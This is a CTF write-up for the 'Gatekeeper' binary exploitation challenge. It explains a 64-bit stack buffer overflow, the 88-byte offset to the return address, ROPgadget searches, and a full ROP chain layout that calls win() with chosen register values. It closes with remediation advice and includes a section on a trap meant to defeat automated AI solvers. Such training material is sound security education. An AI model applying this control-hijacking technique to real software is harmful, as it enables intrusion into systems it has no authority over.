# SecurinetsENIT CTF - Gatekeeper Technical Writeup

- **Wave:** 2 (Control Hijacking & Gadgets)
- **Category:** Pwn / Binary Exploitation
- **Difficulty:** Intermediate
- **Target OS:** Ubuntu 22.04 LTS (x86_64)
- **Mitigations:**
  - Canary: Disabled (`-fno-stack-protector`)
  - NX: Enabled
  - PIE: Disabled (`-no-pie`)

---

## 1. Vulnerability Analysis

In `challenge()`:
```c
char buffer[80];
read(0, buffer, 160);
```
The buffer holds 80 bytes, but `read()` accepts up to 160 bytes.
Offset to Saved RIP:
- `buffer`: 80 bytes
- Saved `RBP`: 8 bytes
- Total offset: `80 + 8 = 88 bytes`.

However, jumping directly to `win()` will fail the conditional check:
```c
if (code1 == 0x1337c0deULL && code2 == 0xcafebebeULL)
```
Because the compiler does not place those arguments into the target registers by default, `code1` and `code2` will contain whatever arbitrary values happened to be in the registers.

---

## 2. The 64-bit AMD64 System V Calling Convention

Unlike 32-bit x86 where function arguments are pushed directly onto the stack, 64-bit Linux requires parameters to be passed in specific CPU registers:
1. First argument: **`RDI`** (`code1`)
2. Second argument: **`RSI`** (`code2`)
3. Third argument: **`RDX`**
4. Fourth argument: **`RCX`**
5. Fifth argument: **`R8`**
6. Sixth argument: **`R9`**

To invoke `win(0x1337c0de, 0xcafebebe)`, our ROP chain must populate:
- `rdi = 0x1337c0de`
- `rsi = 0xcafebebe`

---

## 3. The Anti-AI Trap: Multi-Register Gadgets

Automated AI solvers typically assume either:
1. 32-bit push conventions (`p64(win) + p64(arg1) + p64(arg2)`), which completely fails on 64-bit binaries.
2. An isolated `pop rsi; ret` gadget. In standard GCC-compiled 64-bit binaries, standalone `pop rsi; ret` gadgets are almost never present! Instead, standard gadgets pop two registers:
   ```assembly
   pop rsi; pop r15; ret;
   ```
If a player or automated tool does not inspect the disassembly and forgets to account for the second `pop r15`, the stack offsets misalign and execution jumps into an invalid address!

---

## 4. ROP Chain Construction

Using `ROPgadget` or `ropper`:
```bash
ROPgadget --binary gatekeeper | grep "pop rdi"
# Returns: pop rdi ; ret

ROPgadget --binary gatekeeper | grep "pop rsi"
# Returns: pop rsi ; pop r15 ; ret
```

### Chain Layout:
```
[ 88 bytes Padding ]
[ p64(pop_rdi_ret) ]
[ p64(0x1337c0de) ]        <- Populated into RDI (code1)
[ p64(pop_rsi_r15_ret) ]
[ p64(0xcafebebe) ]        <- Populated into RSI (code2)
[ p64(0x0) ]               <- Dummy value popped into R15
[ p64(ret_gadget) ]        <- 16-byte stack alignment
[ p64(win_addr) ]          <- Execution transfers to win()
```

---

## 5. Defensive Remediation & Secure Coding

1. Bound the read buffer size:
   ```c
   read(0, buffer, sizeof(buffer));
   ```
2. Enable compiler mitigations: `-fstack-protector-strong` and `-fPIE -pie`.
